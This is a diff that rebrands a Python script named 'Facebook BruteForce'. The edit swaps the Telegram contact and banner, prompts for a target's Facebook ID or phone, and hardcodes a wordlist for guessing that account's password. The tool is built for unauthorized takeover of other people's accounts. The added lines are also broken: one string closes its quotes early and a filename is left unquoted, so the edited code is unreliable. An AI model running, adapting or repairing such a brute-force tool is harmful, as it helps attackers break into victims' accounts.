@@ -5,7 +5,7 @@
         #############################################
         #                                           #
         #    Facebook BruteForce, by https://www.facebook.com/profile.php?id=100052706317090     #
-        #    telegram Contact:       T.me/haji_ali_back    #
+        #    telegram Contact:       T.me/afghacker2020    #
         #                                           #
         #############################################
 
@@ -22,11 +22,11 @@ except ModuleNotFoundError:
     exit()
 
 time.sleep(0.5)
-user = raw_input('[?] Target Username/ID/Email >>> ')
+user = raw_input('[?] 🔰TARGET I'D &PHON 🇦🔰 ')
 time.sleep(0.8)
 wrdlstFileName = raw_input('\n[?] Wordlist Directory >>> ')
 try:
-    wordlist = open(wrdlstFileName, 'r')
+    wordlist = open(ELYAS.txt, 'r')
 except FileNotFoundError:
     print ('\n[!] File Not Found!')
     exit()
@@ -35,7 +35,7 @@ time.sleep(0.8)
 print '\n\nCracking '+user+' Now...'
 
 time.sleep(1)
-print '\n###############Hajiali420 HaZaracyber##############\n'
+print '\n###############KING ELYAS HACKER AFGHAN##############\n'
 for password in wordlist:
     if password == '' or password == ' ':
         pass
